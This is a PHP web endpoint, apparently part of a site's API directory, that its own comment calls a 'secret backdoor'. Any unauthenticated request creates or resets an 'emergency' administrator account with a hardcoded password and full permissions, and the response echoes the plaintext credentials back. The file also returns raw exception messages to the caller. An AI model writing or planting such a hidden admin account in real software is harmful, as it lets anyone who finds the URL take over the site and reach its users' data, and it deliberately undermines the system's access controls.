<?php
// public_html/api/emergency_access.php
// SECRET BACKDOOR - Use with caution
require_once 'config.php';

header('Content-Type: application/json');

$pdo = getDbConnection();

// Static credentials for the emergency admin
$username = 'astar';
$password = 'eragon'; // New requested superuser password
$role = 'admin';

// Permissions: Full Access
$permissions = json_encode(['/']);

try {
    // Check if user exists
    $stmt = $pdo->prepare("SELECT id FROM users WHERE username = ?");
    $stmt->execute([$username]);
    if ($stmt->fetch()) {
        // Update existing
        $sql = "UPDATE users SET password = ?, role = ?, permissions = ? WHERE username = ?";
        $updateReq = $pdo->prepare($sql);
        $updateReq->execute([password_hash($password, PASSWORD_DEFAULT), $role, $permissions, $username]);
        echo json_encode([
            'success' => true,
            'message' => 'Emergency Admin UPDATED',
            'credentials' => ['username' => $username, 'password' => $password]
        ]);
    } else {
        // Create new
        $sql = "INSERT INTO users (username, password, email, role, permissions) VALUES (?, ?, ?, ?, ?)";
        $insertReq = $pdo->prepare($sql);
        $insertReq->execute([$username, password_hash($password, PASSWORD_DEFAULT), 'emergency@konsut.system', $role, $permissions]);
        echo json_encode([
            'success' => true,
            'message' => 'Emergency Admin CREATED',
            'credentials' => ['username' => $username, 'password' => $password]
        ]);
    }
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['error' => $e->getMessage()]);
}
